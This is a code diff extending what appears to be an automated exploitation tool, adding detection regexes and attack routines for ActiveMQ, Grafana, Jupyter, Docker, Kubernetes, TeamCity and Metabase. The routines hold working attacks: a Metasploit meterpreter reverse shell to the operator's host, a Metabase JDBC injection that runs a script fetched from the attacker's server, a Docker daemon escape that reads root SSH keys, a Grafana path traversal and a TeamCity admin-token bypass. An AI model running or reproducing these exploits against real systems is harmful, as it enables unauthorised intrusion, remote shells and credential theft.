@@ -9157,6 +9157,47 @@ PRIORITIES (strict order): exploit_confirmed_vuln > dump_creds_post_exploit > ch
             (r'CMDI_CONFIRMED|command injection.*uid=', "Command Injection RCE Confirmado", "critical", "", 9.8),
             (r'WERKZEUG_PIN_FOUND|werkzeug.*console.*uid=', "Werkzeug Debug Console RCE Confirmado", "critical", "", 10.0),
             (r'PHP_TYPEJUGGLING.*:.*admin|type.juggling.*bypass', "PHP Type Juggling Auth Bypass", "critical", "", 9.0),
+            # Docker / Container escape
+            (r'DOCKER_DAEMON_EXPOSED|docker.*run.*--rm.*-v.*chroot.*sh|docker.*root.*container', "Docker Daemon RCE — Escape a Host Root", "critical", "", 10.0),
+            (r'DOCKER_ESCAPE_PRIV|docker.*--privileged.*nsenter|docker.*escape.*root', "Docker Privileged Container Escape a Root", "critical", "", 10.0),
+            (r'DOCKER_SOCK_RCE|/var/run/docker.sock.*cmd|docker\.sock.*exec', "Docker Socket RCE — Host Compromise", "critical", "", 10.0),
+            # Kubernetes
+            (r'KUBERNETES_API_ANONYMOUS|kubectl.*get pods|k8s.*exec.*shell|pod.*exec.*id=', "Kubernetes API — Acceso Anónimo + Pod Exec", "critical", "", 9.8),
+            (r'KERNEL_CREATED:.*[a-f0-9\-]{30,}|JUPYTER_NO_AUTH', "Jupyter Notebook — RCE Sin Token", "critical", "", 9.8),
+            # Grafana / Metabase
+            (r'GRAFANA_DEFAULT_CREDS_VALID|grafana.*admin.*admin.*ok', "Grafana — Admin Access (admin:admin)", "critical", "", 9.8),
+            (r'GRAFANA_CVE_2021_43798_CONFIRMED|root:.*grafana.*traversal', "Grafana — Path Traversal Confirmado", "critical", "CVE-2021-43798", 7.5),
+            (r'METABASE_SETUP_TOKEN.*RCE|metabase.*jdbc.*exec|metabase.*uid=', "Metabase — Pre-Auth RCE Confirmado", "critical", "CVE-2023-38646", 9.8),
+            # TeamCity
+            (r'TEAMCITY_AUTH_BYPASS|teamcity.*token.*created|teamcity.*admin.*without.*cred', "TeamCity — Auth Bypass (CVE-2023-42793)", "critical", "CVE-2023-42793", 9.8),
+            # Apache ActiveMQ
+            (r'ACTIVEMQ_DEFAULT_CREDS|activemq.*admin.*admin.*logged|activemq.*rce.*confirm', "Apache ActiveMQ — Admin Access / RCE", "critical", "CVE-2023-46604", 9.8),
+            # MinIO / Cloud
+            (r'MINIO_SECRET_KEY=|MINIO_ROOT_PASSWORD=|minio.*secret.*exposed', "MinIO — Credenciales Expuestas (CVE-2023-28432)", "critical", "CVE-2023-28432", 7.5),
+            (r'AKIA[A-Z0-9]{16}|ASIA[A-Z0-9]{16}', "AWS — Access Key ID Encontrada", "critical", "", 9.1),
+            (r'"Code"\s*:\s*"Success".*"Type"\s*:\s*"AWS-HMAC"', "AWS — IAM Credentials via IMDS SSRF", "critical", "", 9.8),
+            # VMware vCenter
+            (r'vcenter.*rce.*confirm|vmware.*vcenter.*shell|vSphere.*command.*exec', "VMware vCenter — RCE Confirmado", "critical", "CVE-2021-21985", 9.8),
+            # FortiGate / Network devices
+            (r'FORTIGATE_AUTH_BYPASS|fortigate.*admin.*retrieved|FortiGate.*"id"\s*:\s*"[^"]+"', "FortiGate — Auth Bypass API Confirmado (CVE-2022-40684)", "critical", "CVE-2022-40684", 9.8),
+            (r'CITRIX_BLEED|citrix.*token.*leak|NSC_AAA.*=.*[a-f0-9]{20,}', "Citrix Bleed — Session Token Leak (CVE-2023-4966)", "critical", "CVE-2023-4966", 9.4),
+            # Solr / Kibana
+            (r'solr.*velocity.*rce|SOLR_RCE_CONFIRM|solr.*uid=\d+', "Apache Solr — RCE Confirmado", "critical", "CVE-2019-17558", 9.8),
+            (r'kibana.*rce.*confirm|kibana.*prototype.*pollution.*uid=', "Kibana — RCE via Prototype Pollution Confirmado", "critical", "CVE-2019-7609", 9.8),
+            # Cacti
+            (r'cacti.*unauthenticated.*cmd|cacti.*rce.*confirm|cacti.*uid=', "Cacti — Command Injection Sin Auth Confirmado", "critical", "CVE-2022-46169", 9.8),
+            # Zabbix
+            (r'ZABBIX_AUTH_BYPASS|zabbix.*admin.*bypassed|zabbix.*saml.*session', "Zabbix — SAML Auth Bypass Confirmado (CVE-2022-23131)", "critical", "CVE-2022-23131", 9.8),
+            # SSRF / IDOR
+            (r'SSRF_CONFIRMED|ssrf.*callback.*received|169\.254\.169\.254.*ami-id', "SSRF — Callback Recibido / Metadata Accesible", "critical", "", 9.1),
+            (r'IDOR_CONFIRMED|idor.*unauthorized.*access', "IDOR — Acceso No Autorizado Confirmado", "high", "", 7.5),
+            # Spring Boot actuator
+            (r'actuator/env.*password|spring.*datasource.*password|management\.security\.enabled.*false', "Spring Boot — Credenciales via Actuator /env", "critical", "", 9.0),
+            (r'heapdump.*downloaded|/actuator/heapdump.*200', "Spring Boot — Heap Dump Obtenido (Credenciales Posibles)", "high", "", 7.5),
+            # Prototype pollution → admin
+            (r'__proto__.*isAdmin.*true|prototype.*pollution.*admin.*true', "Prototype Pollution → Admin Bypass Confirmado", "critical", "", 9.0),
+            # RocketChat / Backstage
+            (r'backstage.*vm2.*escape|backstage.*rce.*confirm', "Backstage — VM2 Sandbox Escape RCE", "critical", "CVE-2022-36067", 9.8),
         ]
         # Save ALL matches (not just first) — deduplicate by title
         for pattern, title, severity, cve, cvss in EXPLOIT_MARKERS:
@@ -17393,6 +17434,199 @@ PRIORITIES (strict order): exploit_confirmed_vuln > dump_creds_post_exploit > ch
                         "cve": "CVE-2025-24813",
                     }], target)
                 accumulated_output.append(f"=== Tomcat PUT RCE {tc_base} ===\n{tc_put[:400]}")
+
+        # ── Apache ActiveMQ CVE-2023-46604 ─────────────────────────────────────
+        if 61616 in port_set or 8161 in port_set:
+            self._log(f"[RECENT-CVE] Probando Apache ActiveMQ CVE-2023-46604")
+            activemq_out, _ = self._run_cmd(
+                "activemq-cve-2023-46604",
+                f"# ActiveMQ admin check\n"
+                f"curl -s --max-time 8 -u admin:admin 'http://{target}:8161/api/jolokia/version' 2>/dev/null | "
+                f"python3 -c 'import sys,json; d=json.load(sys.stdin); print(\"ACTIVEMQ_ADMIN:\",d.get(\"value\",{{}}).get(\"agent\",\"\"))' 2>/dev/null; "
+                f"# MSF exploit for CVE-2023-46604\n"
+                f"msfconsole -q -x 'use exploit/multi/misc/apache_activemq_rce_cve_2023_46604; "
+                f"set RHOSTS {target}; set RPORT 61616; "
+                f"set PAYLOAD java/meterpreter/reverse_tcp; "
+                f"set LHOST {self.lhost}; set LPORT {self.lport}; "
+                f"run; sleep 15; {self._MSF_LINUX_POST}; sleep 3; exit' 2>/dev/null | head -40",
+                target, timeout=120,
+            )
+            self._capture_evidence(activemq_out, target, "activemq-rce", "CVE-2023-46604")
+            if activemq_out.strip():
+                accumulated_output.append(f"=== ActiveMQ CVE-2023-46604 ===\n{activemq_out[:600]}")
+
+        # ── Grafana CVE-2021-43798 Path Traversal ─────────────────────────────
+        grafana_ports = [p for p in open_ports if p["port"] == 3000 or "grafana" in p.get("version","").lower()]
+        for gp in grafana_ports[:2]:
+            gport = gp["port"]
+            gproto = "https" if gport in (443, 8443) else "http"
+            self._log(f"[RECENT-CVE] Probando Grafana CVE-2021-43798 en {target}:{gport}")
+            grafana_out, _ = self._run_cmd(
+                f"grafana-43798-{gport}",
+                f"# Grafana path traversal\n"
+                f"for plugin in alertlist cloudwatch elasticsearch; do "
+                f"R=$(curl -s --max-time 8 --path-as-is "
+                f"'http://{target}:{gport}/public/plugins/'$plugin'/../../../../../../../../../etc/passwd' 2>/dev/null); "
+                f"echo \"$R\" | grep -q 'root:' && {{ echo \"GRAFANA_CVE_2021_43798_CONFIRMED\"; echo \"$R\" | head -5; break; }}; done; "
+                f"# Try default creds\n"
+                f"curl -s --max-time 8 -u admin:admin 'http://{target}:{gport}/api/org' 2>/dev/null | "
+                f"grep -q '\"id\"' && echo 'GRAFANA_DEFAULT_CREDS_VALID'; "
+                f"curl -s --max-time 8 'http://{target}:{gport}/api/health' 2>/dev/null | "
+                f"python3 -c 'import sys,json; d=json.load(sys.stdin); print(\"Grafana\",d.get(\"version\",\"\"))' 2>/dev/null",
+                target, timeout=30,
+            )
+            self._capture_evidence(grafana_out, target, f"grafana-{gport}", "CVE-2021-43798")
+            if "GRAFANA" in grafana_out:
+                accumulated_output.append(f"=== Grafana {gport} ===\n{grafana_out[:600]}")
+                sev = "critical" if "CONFIRMED" in grafana_out or "CREDS_VALID" in grafana_out else "high"
+                self._save_findings([{
+                    "title": f"Grafana {'Path Traversal CVE-2021-43798' if 'CONFIRMED' in grafana_out else 'Default Creds'} @ {target}:{gport}",
+                    "severity": sev,
+                    "description": grafana_out[:400],
+                    "cve": "CVE-2021-43798" if "CONFIRMED" in grafana_out else "",
+                }], target)
+
+        # ── Jupyter Notebook no-auth RCE ───────────────────────────────────────
+        if 8888 in port_set:
+            self._log(f"[RECENT-CVE] Probando Jupyter Notebook no-auth en {target}:8888")
+            jupyter_out, _ = self._run_cmd(
+                "jupyter-noauth-rce",
+                f"# Check Jupyter accessible without token\n"
+                f"STATUS=$(curl -s --max-time 8 -o /dev/null -w '%{{http_code}}' 'http://{target}:8888/api/kernelspecs' 2>/dev/null); "
+                f"if [ \"$STATUS\" = '200' ]; then "
+                f"  echo 'JUPYTER_NO_AUTH'; "
+                f"  # Create kernel and execute code\n"
+                f"  KID=$(curl -s --max-time 8 -X POST 'http://{target}:8888/api/kernels' "
+                f"-H 'Content-Type: application/json' -d '{{\"name\":\"python3\"}}' 2>/dev/null | "
+                f"python3 -c 'import sys,json; k=json.load(sys.stdin); print(k.get(\"id\",\"\"))' 2>/dev/null); "
+                f"  echo \"KERNEL_CREATED: $KID\"; "
+                f"  # For RCE, WebSocket execution would be needed — document the finding\n"
+                f"  curl -s --max-time 8 'http://{target}:8888/api/terminals' 2>/dev/null | "
+                f"    python3 -c 'import sys,json; t=json.load(sys.stdin); print(\"JUPYTER_TERMINALS:\",len(t))' 2>/dev/null; "
+                f"else "
+                f"  echo \"Jupyter requires token (status $STATUS)\"; "
+                f"fi",
+                target, timeout=25,
+            )
+            self._capture_evidence(jupyter_out, target, "jupyter-noauth", "Jupyter no-auth")
+            if "JUPYTER_NO_AUTH" in jupyter_out or "KERNEL_CREATED" in jupyter_out:
+                accumulated_output.append(f"=== Jupyter No-Auth ===\n{jupyter_out[:400]}")
+                self._save_findings([{
+                    "title": f"Jupyter Notebook — RCE Sin Autenticación @ {target}:8888",
+                    "severity": "critical",
+                    "description": f"Jupyter Notebook accesible sin token → ejecución de código Python sin credenciales.\n{jupyter_out[:200]}",
+                    "cve": "",
+                }], target)
+
+        # ── Docker daemon no TLS ────────────────────────────────────────────────
+        if 2375 in port_set or 2376 in port_set:
+            docker_port = 2375 if 2375 in port_set else 2376
+            self._log(f"[RECENT-CVE] Probando Docker daemon expuesto en {target}:{docker_port}")
+            docker_out, _ = self._run_cmd(
+                f"docker-daemon-rce-{docker_port}",
+                f"# Docker daemon RCE\n"
+                f"docker -H tcp://{target}:{docker_port} info 2>/dev/null | head -15; "
+                f"echo '---'; "
+                f"docker -H tcp://{target}:{docker_port} run --rm -v /:/mnt alpine sh -c "
+                f"'echo DOCKER_DAEMON_EXPOSED; id; cat /mnt/etc/passwd | head -5; "
+                f"cat /mnt/root/root.txt 2>/dev/null; "
+                f"cat /mnt/home/*/user.txt 2>/dev/null | head -3; "
+                f"cat /mnt/root/.ssh/id_rsa 2>/dev/null | head -5' 2>/dev/null | head -30",
+                target, timeout=60,
+            )
+            self._capture_evidence(docker_out, target, f"docker-daemon-{docker_port}", "Docker no-TLS")
+            if "DOCKER_DAEMON_EXPOSED" in docker_out or "Server Version" in docker_out:
+                accumulated_output.append(f"=== Docker Daemon {docker_port} ===\n{docker_out[:600]}")
+                self._save_findings([{
+                    "title": f"Docker Daemon Sin TLS — RCE como root del Host @ {target}:{docker_port}",
+                    "severity": "critical",
+                    "description": f"Docker daemon accesible sin autenticación. Container con volumen / montado → root del host.\n{docker_out[:300]}",
+                    "cve": "",
+                }], target)
+
+        # ── Kubernetes API anonymous ────────────────────────────────────────────
+        if 6443 in port_set or 8001 in port_set or 10250 in port_set:
+            k8s_port = next((p for p in [6443, 8001, 10250] if p in port_set), 6443)
+            self._log(f"[RECENT-CVE] Probando Kubernetes API anónimo en {target}:{k8s_port}")
+            k8s_out, _ = self._run_cmd(
+                f"k8s-anon-{k8s_port}",
+                f"# K8s anonymous access\n"
+                f"curl -sk --max-time 10 'https://{target}:{k8s_port}/api/v1/namespaces' 2>/dev/null | "
+                f"python3 -c 'import sys,json; d=json.load(sys.stdin); ns=[n[\"metadata\"][\"name\"] for n in d.get(\"items\",[])]; "
+                f"print(\"KUBERNETES_API_ANONYMOUS\") if ns else None; [print(n) for n in ns[:5]]' 2>/dev/null; "
+                f"kubectl --server=https://{target}:{k8s_port} --insecure-skip-tls-verify auth can-i --list 2>/dev/null | "
+                f"grep -E 'pods|exec|secrets|create' | head -8; "
+                f"# Kubelet direct (10250) — exec without auth\n"
+                f"curl -sk --max-time 10 'https://{target}:10250/pods' 2>/dev/null | "
+                f"python3 -c 'import sys,json; d=json.load(sys.stdin); "
+                f"[print(p[\"metadata\"][\"namespace\"]+\"/\"+p[\"metadata\"][\"name\"]) for p in d.get(\"items\",[])[:5]]' 2>/dev/null",
+                target, timeout=30,
+            )
+            self._capture_evidence(k8s_out, target, f"k8s-anon-{k8s_port}", "K8s anonymous")
+            if "KUBERNETES_API_ANONYMOUS" in k8s_out or ("kube-system" in k8s_out):
+                accumulated_output.append(f"=== Kubernetes API Anonymous ===\n{k8s_out[:600]}")
+                self._save_findings([{
+                    "title": f"Kubernetes API Server — Acceso Anónimo @ {target}:{k8s_port}",
+                    "severity": "critical",
+                    "description": f"Kubernetes API accesible sin auth. Namespaces listados, posible pod exec y secret dump.\n{k8s_out[:300]}",
+                    "cve": "",
+                }], target)
+
+        # ── TeamCity CVE-2023-42793 auth bypass ────────────────────────────────
+        tc_ports = [p for p in open_ports if p["port"] in (8111, 8112, 8113) or "teamcity" in p.get("version","").lower()]
+        for tcp in tc_ports[:2]:
+            tc_port = tcp["port"]
+            self._log(f"[RECENT-CVE] Probando TeamCity CVE-2023-42793 en {target}:{tc_port}")
+            tc_out, _ = self._run_cmd(
+                f"teamcity-42793-{tc_port}",
+                f"# CVE-2023-42793 auth bypass via /app/rest/server\n"
+                f"curl -s --max-time 10 'http://{target}:{tc_port}/app/rest/server' 2>/dev/null | "
+                f"python3 -c 'import sys,json; d=json.load(sys.stdin); print(\"TeamCity\",d.get(\"version\",\"\"))' 2>/dev/null; "
+                f"# Create admin token without auth\n"
+                f"TOKEN=$(curl -s --max-time 10 -X POST 'http://{target}:{tc_port}/app/rest/users/id:1/tokens/RPC2' 2>/dev/null | "
+                f"python3 -c 'import sys,json; d=json.load(sys.stdin); print(d.get(\"value\",\"\"))' 2>/dev/null); "
+                f"[ -n \"$TOKEN\" ] && echo \"TEAMCITY_AUTH_BYPASS_TOKEN: $TOKEN\" && "
+                f"curl -s --max-time 10 -H \"Authorization: Bearer $TOKEN\" 'http://{target}:{tc_port}/app/rest/users' 2>/dev/null | "
+                f"python3 -c 'import sys,json; d=json.load(sys.stdin); [print(u.get(\"username\")) for u in d.get(\"user\",[])[:5]]' 2>/dev/null",
+                target, timeout=25,
+            )
+            self._capture_evidence(tc_out, target, f"teamcity-{tc_port}", "CVE-2023-42793")
+            if "TEAMCITY_AUTH_BYPASS_TOKEN" in tc_out or "TeamCity" in tc_out:
+                accumulated_output.append(f"=== TeamCity CVE-2023-42793 ===\n{tc_out[:600]}")
+                if "BYPASS_TOKEN" in tc_out:
+                    self._save_findings([{
+                        "title": f"TeamCity Auth Bypass CVE-2023-42793 @ {target}:{tc_port}",
+                        "severity": "critical",
+                        "description": f"Admin token creado sin credenciales → RCE via runner plugin.\n{tc_out[:300]}",
+                        "cve": "CVE-2023-42793",
+                    }], target)
+
+        # ── Metabase CVE-2023-38646 pre-auth RCE ──────────────────────────────
+        metabase_ports = [p for p in open_ports if p["port"] in (3000, 3001) or "metabase" in p.get("version","").lower()]
+        for mp in metabase_ports[:2]:
+            mb_port = mp["port"]
+            self._log(f"[RECENT-CVE] Probando Metabase CVE-2023-38646 en {target}:{mb_port}")
+            mb_out, _ = self._run_cmd(
+                f"metabase-38646-{mb_port}",
+                f"# Metabase setup token exposure\n"
+                f"TOKEN=$(curl -s --max-time 10 'http://{target}:{mb_port}/api/session/properties' 2>/dev/null | "
+                f"python3 -c 'import sys,json; d=json.load(sys.stdin); t=d.get(\"setup-token\",\"\"); print(t) if t else None' 2>/dev/null); "
+                f"[ -n \"$TOKEN\" ] && echo \"METABASE_SETUP_TOKEN: $TOKEN\" && "
+                f"curl -s --max-time 15 -X POST 'http://{target}:{mb_port}/api/setup/validate' "
+                f"-H 'Content-Type: application/json' "
+                f"-d '{{\"token\":\"'$TOKEN'\",\"details\":{{\"is_on_demand\":false,\"is_full_sync\":true,\"is_sample\":false,\"cache_ttl\":null,\"refingerprint\":false,\"auto_run_queries\":true,\"schedules\":{{}},\"details\":{{\"db\":\"zip:/app/metabase.jar!/sample-database.db;TRACE_LEVEL_SYSTEM_OUT=0\\nRUNSCRIPT FROM http://{self.lhost}:8080/r.sql\",\"advanced-options\":false,\"ssl\":false}},\"name\":\"x\",\"engine\":\"h2\"}}}}' 2>/dev/null | head -10 || "
+                f"echo 'metabase_token_not_found'",
+                target, timeout=25,
+            )
+            self._capture_evidence(mb_out, target, f"metabase-{mb_port}", "CVE-2023-38646")
+            if "METABASE_SETUP_TOKEN" in mb_out:
+                accumulated_output.append(f"=== Metabase CVE-2023-38646 ===\n{mb_out[:400]}")
+                self._save_findings([{
+                    "title": f"Metabase Pre-Auth RCE CVE-2023-38646 @ {target}:{mb_port}",
+                    "severity": "critical",
+                    "description": f"Setup token expuesto → JDBC injection → RCE sin credenciales.\n{mb_out[:300]}",
+                    "cve": "CVE-2023-38646",
+                }], target)
 
     def _vuln_chain_engine(self, target, open_ports, accumulated_output):
         """C1: Auto-chain detected vulns into deeper exploits."""
